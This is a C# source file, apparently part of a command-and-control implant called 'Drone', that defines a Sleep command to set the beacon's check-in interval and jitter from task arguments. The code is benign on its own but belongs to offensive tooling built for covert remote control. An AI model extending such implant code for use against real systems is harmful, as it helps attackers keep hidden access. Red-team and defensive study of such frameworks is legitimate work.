using System.Threading;
using System.Threading.Tasks;

using Drone.Models;

namespace Drone.Commands;

public sealed class Sleep : DroneCommand
{
    public override byte Command => 0x1D;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        if (task.Arguments.Length > 0)
            Drone.Config.Set(Setting.SleepInterval, int.Parse(task.Arguments[0]));
        
        if (task.Arguments.Length > 1)
            Drone.Config.Set(Setting.SleepJitter, int.Parse(task.Arguments[1]));

        await Drone.SendTaskComplete(task);
    }
}